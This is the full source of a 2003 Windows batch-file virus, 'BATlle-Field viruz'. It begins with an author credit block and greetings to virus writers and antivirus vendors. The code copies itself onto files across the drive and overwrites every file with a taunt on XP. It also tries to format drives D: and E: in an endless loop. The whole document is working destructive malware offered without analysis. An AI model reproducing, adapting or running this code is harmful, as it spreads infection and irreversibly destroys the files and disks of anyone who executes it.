:: ���� BATlle-Field viruz by Ratty and DvL ۲��
::      ===================================
:: 14.05.2003
:: Created by 2 good friends reunited
:: DvL      ( dvl2003ro@yahoo.co.uk )
:: Ratty    ( ratty2001ro@yahoo.com )
:: Contact us.
:: GreetZ <-- VX GuyZ : SpTh  --> www.spth.de.vu        --> working
:: ======     =======   Ratty --> http://ratty.home.ro/ --> work in progress
::        <-- Av GuyZ : Adder --> www.bitdefender.com   --> working
::            =======   Kav   --> www.kaspersky.com     --> working
::        <-- Misc    : NgL   --> my girlfriend
::            ====      MJ    --> my BEST friend
@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto w1nd0z3
if not errorlevel 1 goto :XP
:XP
for /r \ %%i in (*.*) do copy %%i+%0 %%i
:: The next line is unuseful :)
for /r \ %%i in (*.*) do echo DvL and Ratty killed your DATA > %%i
if exist echo y | format e:
if exist echo y | format d:
goto XP
ctty con
exit
:w1nd0z3
@for %%a in (*.*, ..\*.*, %windir%\*.*, %windir%\system\*.*, c:\mydocu~1\*.*) do copy %%a+%0 %%a
@if exist echo y | format e:/q/autotest
@if exist echo y | format d:/q/autotest
goto w1nd0z3
:: BATlle-Field viruz by Ratty and DvL
:: 14.05.2003
ctty con
cls